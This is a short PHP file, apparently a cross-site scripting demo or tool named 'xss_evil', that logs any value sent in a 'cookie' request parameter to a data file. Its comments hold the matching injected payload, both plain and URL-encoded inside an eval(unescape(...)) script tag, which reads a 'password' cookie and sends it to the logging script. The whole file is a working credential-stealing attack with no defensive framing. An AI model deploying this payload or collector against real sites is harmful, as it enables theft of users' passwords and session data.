<?php
// if (YAHOO.util.Cookie.get("password")) { YAHOO.util.Connect.asyncRequest("GET", "xss_evil.php?cookie=" + encodeURIComponent(YAHOO.util.Cookie.get("password")), {}); }
// <script>eval(unescape(/if%20%28YAHOO.util.Cookie.get%28%22password%22%29%29%20%7B%20YAHOO.util.Connect.asyncRequest%28%22GET%22%2C%20%22xss_evil.php%3Fcookie%3D%22%20+%20encodeURIComponent%28YAHOO.util.Cookie.get%28%22password%22%29%29%2C%20%7B%7D%29%3B%20%7D/.source))</script>
$myFile = "xss_evil.data";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_GET['cookie'] . "\n";
fwrite($fh, $stringData);
fclose($fh);
?>